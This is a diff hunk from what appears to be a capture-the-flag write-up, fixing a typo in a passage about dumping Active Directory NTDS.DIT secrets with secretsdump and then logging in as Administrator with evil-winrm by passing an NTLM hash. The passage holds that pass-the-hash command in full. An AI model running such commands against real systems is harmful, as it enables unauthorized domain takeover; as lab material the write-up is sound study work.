@@ -406,7 +406,7 @@ So i used metasploit with secretsdump.py und set lhost, SMBDomain, RHOSTS, SMBPa
     [*] Auxiliary module execution completed
     ```
 
-Secretsdump.py usese the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: ```evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc```
+Secretsdump.py uses the DRSUAPI method to get NTDS.DIT secrets. We can feed evil-winrm with the hash of the adminstrator to gain access using this command: ```evil-winrm -i 10.10.12.33 -u Administrator -H 0e0363213e37b94221497260b0bcb4fc```
 
 ??? output "evil-winrm output and flags"
     ```txt
